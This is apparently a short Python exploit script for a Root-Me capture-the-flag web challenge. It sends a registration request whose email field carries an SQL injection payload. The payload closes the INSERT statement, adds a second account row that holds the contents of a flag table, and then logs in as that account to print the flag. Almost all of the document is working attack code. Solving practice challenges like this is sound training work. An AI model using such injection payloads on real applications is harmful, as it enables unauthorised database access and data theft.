import requests


# inject theo cai nay https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635


url = "http://challenge01.root-me.org/web-serveur/ch33/?action=register"

data = {"username":"huydoppa",
"password":"1235",
"email":"a'),('cdick','bb',(select group_concat(flag) from flag))-- -"}

requests.post(url,data=data)

url1 = "http://challenge01.root-me.org/web-serveur/ch33/?action=login"


data = {"username":"cdick",
        "password":"bb"}

print(requests.post(url1,data=data).text)